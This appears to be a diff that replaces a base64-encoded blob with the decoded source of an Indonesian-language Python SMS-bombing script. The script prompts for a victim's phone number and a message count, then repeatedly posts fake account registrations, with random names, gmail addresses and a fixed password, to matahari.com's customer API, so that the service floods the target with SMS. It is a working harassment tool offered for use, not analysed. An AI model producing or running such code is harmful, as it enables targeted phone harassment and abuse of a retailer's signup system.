@@ -1,1 +1,94 @@
-dHJ5OiAgICAjIEphbmdnYW4gZGkgdWJhaA0KICAgICAgICBpbXBvcnQgdGltZSxzeXMsb3MsanNvbixyZXF1ZXN0cyxyYW5kb20NCmV4Y2VwdCBNb2R1bGVOb3RGb3VuZEVycm9yOg0KICAgICAgICAgcHJpbnQgKCdbIV0gSW5zdGFsbCBNb2R1bCBSZXF1ZXN0cycpDQogICAgICAgICBvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJykNCg0KdHJ5OiAgICAjIEphbmdnYW4gZGkgdWJhaA0KICAgICAgICBpcCA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnJykudGV4dA0KZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuQ29ubmVjdGlvbkVycm9yOg0KICAgICAgICBleGl0KCcgWyFdIEtvbmVrc2kgSW50ZXJuZXQgRXJyb3InKQ0KDQojIEphbmdnYW4gZGkgdWJhaA0KRW1haWwgPSByYW5kb20uY2hvaWNlKFsnbGF2b24ubG9ja21hbkBnbWFpbC5jb20nLCdkdWFuZV9tY2xhdWdobGluMzhAZ21haWwuY29tJywnYWxmcmVkYS5saW5kZ3JlbkBnbWFpbC5jb20nLCdsZW9uYXJkb19rdWhsbWFuQGdtYWlsLmNvbScsJ2x5cmljNTFAZ21haWwuY29tJywnZGV2b250ZV9saXR0ZWxAZ21haWwuY29tJywnbmV3ZWxsLmt1aGljQGdtYWlsLmNvbSddKQ0KIyBKYW5nZ2FuIGRpIHViYWgNCk5hbWUgPSByYW5kb20uY2hvaWNlKFsiSGFsbyBQZW5pcHUiLCJIYWxvIEthd2FuIiwiSGFsbyBTYXlhbmciLCJIYWxvIEphbmRhIiwiSGFsbyBSaXBwZXIiXSkNCg0KYSxtLGgsayxiLHUsYyxwLGJuLG8gPSBbDQonXDAzM1s5MG0nLA0KJ1wwMzNbMzFtJywNCidcMDMzWzMybScsDQonXDAzM1szM20nLA0KJ1wwMzNbOTRtJywNCidcMDMzWzM1bScsDQonXDAzM1szNm0nLA0KJ1wwMzNbMzdtJywNCidcMDMzWzQxbScsDQonXDAzM1swbScNCl0NCg0KaW1wb3J0IG9zDQoNCm9zLnN5c3RlbSgiY2xlYXIiKQ0KYmFubmVyPSAiIiINClwwMzNbMzFtICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgXDAzM1szMW0gICAgX19fX18NClwwMzNbMzFtICAvIF9fXy9fX19fICBfX19fIF9fX19fIF9fXyAgXDAzM1szMW0gICAvIF9fXy9fX19fIF9fXyAgX19fX18NClwwMzNbMzFtICBcX18gXC8gX18gXC8gX18gYC8gX18gYF9fIFwgXDAzM1szMW0gICBcX18gXC8gX18gYF9fIFwvIF9fXy8NClwwMzNbMzdtIF9fXy8gLyAvXy8gLyAvXy8gLyAvIC8gLyAvIC8gXDAzM1szN20gIF9fXy8gLyAvIC8gLyAvIChfXyAgKQ0KXDAzM1szMW0vX19fXy8gLl9fXy9cX18sXy9fLyAvXy8gL18vICBcMDMzWzMxbSAvX19fXy9fLyAvXy8gL18vX19fXy8NClwwMzNbMzdtICAgIC9fLyANClwwMzNbMzdtW+KAol3ilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIBb4oCiXQ0KXDAzM1szMW0gfCBbWF0gIEF1dGhvciAgOiBERU1PTiAJCSAgICAgICB8DQpcMDMzWzMxbSB8IFtYXSAgVEVBTSAgICA6IFhYWFhYICAgICAgICAgICAgICAgICAgICAgICAgfA0KXDAzM1szN21b4oCiXeKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgFvigKJdIiIiDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCnByaW50IChiYW5uZXIpDQpwcmludCAoJyVzWyVzKyVzXSAlc0lQIEthbXUgJXM6ICVzJXMnICUgKHAsaCxwLGssbSxoLGlwKSkNCm5vID0gaW5wdXQoJ1xuXDAzM1szN21bXDAzM1szMW3igKJcMDMzWzM3bV0gXDAzM1szMW1leCBcMDMzWzM3bTogXDAzM1szMW0wOHh4XG5cMDMzWzM3bVtcMDMzWzMybStcMDMzWzM3bV0gXDAzM1szMW1QaG9uZVwwMzNbMzdtOlwwMzNbMzJtICcpDQppZiBubyA9PScnOg0KICAgZXhpdCgnXDAzM1szN21bXDAzM1szMW0hXDAzM1szN21dIERvbnQgYmUgZW1wdHkgJykNCmVsaWYgbGVuKG5vKSA8PSA5Og0KICAgZXhpdCgnXDAzM1szN21bXDAzM1szMW0hXDAzM1szN21dIEludmFsaWQgbnVtYmVyICcpDQplbHNlOg0KICAgam1sID0gaW50KGlucHV0KCdcblwwMzNbMzdtW1wwMzNbMzJtK1wwMzNbMzdtXSBcMDMzWzMxbUFtb3VudFwwMzNbMzdtOlwwMzNbMzJtICcpKQ0KDQojIEphbmdnYW4gZGkgdWJhaA0KaGVkZXIgPSB7J0hvc3QnOiAnd3d3Lm1hdGFoYXJpLmNvbScsDQogICAgICAgICAgICdjb250ZW50LWxlbmd0aCc6ICcyNDAnLA0KICAgICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vd3d3Lm1hdGFoYXJpLmNvbScsDQogICAgICAgICAgICd4LW5ld3JlbGljLWlkJzogJ1ZnNEdWRlZYRHhBR1ZWbFZCZ2NHVmxZPScsDQogICAgICAgICAgICdjb250ZW50LXR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsDQogICAgICAgICAgICdhY2NlcHQnOiAnKi8qJywNCiAgICAgICAgICAgJ3VzZXItYWdlbnQnOiAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyB2aXZvIDIwMDcpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85Ni4wLjQ2NjQuNDUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLA0KICAgICAgICAgICAnc2F2ZS1kYXRhJzogJ29uJywNCiAgICAgICAgICAgJ3NlYy1mZXRjaC1zaXRlJzogJ3NhbWUtb3JpZ2luJywNCiAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLA0KICAgICAgICAgICAnc2VjLWZldGNoLWRlc3QnOiAnZW1wdHknLA0KICAgICAgICAgICAncmVmZXJlcic6ICdodHRwczovL3d3dy5tYXRhaGFyaS5jb20vY3VzdG9tZXIvYWNjb3VudC9jcmVhdGUvJywNCiAgICAgICAgICAgJ2FjY2VwdC1lbmNvZGluZyc6ICdnemlwLCBkZWZsYXRlLCBicicsDQogICAgICAgICAgICdhY2NlcHQtbGFuZ3VhZ2UnOiAnaWQtSUQsaWQ7cT0wLjksZW47cT0wLjgnfQ0KDQojIEphbmdnYW4gZGkgdWJhaA0KZGF0YSA9IHsNCgkidGhvcl9jdXN0b21lciI6IHsNCgkJIm5hbWUiOiBOYW1lLA0KCQkiZW1haWxfYWRkcmVzcyI6IEVtYWlsLA0KCQkibW9iaWxlX2NvdW50cnlfY29kZSI6ICIrNjIiLA0KCQkiZ2VuZGVyX2lkIjogIjEiLA0KCQkibW9iaWxlX251bWJlciI6IG5vLA0KCQkibXJvIjogIiIsDQoJCSJwYXNzd29yZCI6ICJXYWRlcGFrMTAzNyIsDQoJCSJiaXJ0aF9kYXRlIjogIjA0LzAyLzIwMjIiDQoJCX0NCgl9DQoNCnByaW50KCJcblwwMzNbMzFtW1wwMzNbMzFtIVwwMzNbMzFtXSBcMDMzWzM3bU1lc3NhZ2UgLi5cbiIpDQpmb3IgaSBpbiByYW5nZShqbWwpOg0KICAgICAgIyBKYW5nZ2FuIGRpIHViYWgNCiAgICAgIHNlYyA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3Lm1hdGFoYXJpLmNvbS9yZXN0L1YxL3Rob3JDdXN0b21lcnMnLCBoZWFkZXJzPWhlZGVyLCBqc29uPWRhdGEpDQogICAgICBpZiAnU3VjY2VzcycgaW4gc2VjLnRleHQ6DQogICAgICAgICAgIHByaW50KGYnXDAzM1szN21bXDAzM1szNW17aSsxfVwwMzNbMzdtXSBcMDMzWzM3bU1lc3NhZ2UgXDAzM1szMW3ihpIgXDAzM1szMm1TcGFtIFNtcyBTdWNjZXNzJykNCiAgICAgIGVsc2U6DQogICAgICAgICAgIHByaW50KGYnXDAzM1szN21bXDAzM1szNW17aSsxfVwwMzNbMzdtXSBcMDMzWzM3bU1lc3NhZ2UgXDAzM1szMW3ihpIgXDAzM1szMW1TcGFtIFNtcyBGYWlsZWQnKQ0KICAgICAgdGltZS5zbGVlcCgxLjUpDQpwcmludCAoJ1xuXDAzM1szN21bXDAzM1szNW3inJNcMDMzWzM3bV0gXDAzM1szM21TcGFtIENvbXBsZXRlIFwwMzNbMzFtPi48Jyk=
+try:    # Janggan di ubah
+        import time,sys,os,json,requests,random
+except ModuleNotFoundError:
+         print ('[!] Install Modul Requests')
+         os.system('pip install requests')
+
+try:    # Janggan di ubah
+        ip = requests.get('https://api.ipify.org').text
+except requests.exceptions.ConnectionError:
+        exit(' [!] Koneksi Internet Error')
+
+# Janggan di ubah
+Email = random.choice(['lavon.lockman@gmail.com','duane_mclaughlin38@gmail.com','alfreda.lindgren@gmail.com','leonardo_kuhlman@gmail.com','lyric51@gmail.com','devonte_littel@gmail.com','newell.kuhic@gmail.com'])
+# Janggan di ubah
+Name = random.choice(["Halo Penipu","Halo Kawan","Halo Sayang","Halo Janda","Halo Ripper"])
+
+a,m,h,k,b,u,c,p,bn,o = [
+'\033[90m',
+'\033[31m',
+'\033[32m',
+'\033[33m',
+'\033[94m',
+'\033[35m',
+'\033[36m',
+'\033[37m',
+'\033[41m',
+'\033[0m'
+]
+
+import os
+
+os.system("clear")
+banner= """
+\033[31m   _____                      \033[31m    _____
+\033[31m  / ___/____  ____ _____ ___  \033[31m   / ___/____ ___  _____
+\033[31m  \__ \/ __ \/ __ `/ __ `__ \ \033[31m   \__ \/ __ `__ \/ ___/
+\033[37m ___/ / /_/ / /_/ / / / / / / \033[37m  ___/ / / / / / (__  )
+\033[31m/____/ .___/\__,_/_/ /_/ /_/  \033[31m /____/_/ /_/ /_/____/
+\033[37m    /_/ 
+\033[37m[•]───────────────────────────────────────────[•]
+\033[31m | [X]  Author  : DEMON 		       |
+\033[31m | [X]  TEAM    : XXXXX                        |
+\033[37m[•]───────────────────────────────────────────[•]"""
+os.system('clear')
+print (banner)
+print ('%s[%s+%s] %sIP Kamu %s: %s%s' % (p,h,p,k,m,h,ip))
+no = input('\n\033[37m[\033[31m•\033[37m] \033[31mex \033[37m: \033[31m08xx\n\033[37m[\033[32m+\033[37m] \033[31mPhone\033[37m:\033[32m ')
+if no =='':
+   exit('\033[37m[\033[31m!\033[37m] Dont be empty ')
+elif len(no) <= 9:
+   exit('\033[37m[\033[31m!\033[37m] Invalid number ')
+else:
+   jml = int(input('\n\033[37m[\033[32m+\033[37m] \033[31mAmount\033[37m:\033[32m '))
+
+# Janggan di ubah
+heder = {'Host': 'www.matahari.com',
+           'content-length': '240',
+           'origin': 'https://www.matahari.com',
+           'x-newrelic-id': 'Vg4GVFVXDxAGVVlVBgcGVlY=',
+           'content-type': 'application/json',
+           'accept': '*/*',
+           'user-agent': 'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
+           'save-data': 'on',
+           'sec-fetch-site': 'same-origin',
+           'sec-fetch-mode': 'cors',
+           'sec-fetch-dest': 'empty',
+           'referer': 'https://www.matahari.com/customer/account/create/',
+           'accept-encoding': 'gzip, deflate, br',
+           'accept-language': 'id-ID,id;q=0.9,en;q=0.8'}
+
+# Janggan di ubah
+data = {
+	"thor_customer": {
+		"name": Name,
+		"email_address": Email,
+		"mobile_country_code": "+62",
+		"gender_id": "1",
+		"mobile_number": no,
+		"mro": "",
+		"password": "Wadepak1037",
+		"birth_date": "04/02/2022"
+		}
+	}
+
+print("\n\033[31m[\033[31m!\033[31m] \033[37mMessage ..\n")
+for i in range(jml):
+      # Janggan di ubah
+      sec = requests.post('https://www.matahari.com/rest/V1/thorCustomers', headers=heder, json=data)
+      if 'Success' in sec.text:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[37mMessage \033[31m→ \033[32mSpam Sms Success')
+      else:
+           print(f'\033[37m[\033[35m{i+1}\033[37m] \033[37mMessage \033[31m→ \033[31mSpam Sms Failed')
+      time.sleep(1.5)
+print ('\n\033[37m[\033[35m✓\033[37m] \033[33mSpam Complete \033[31m>.<')
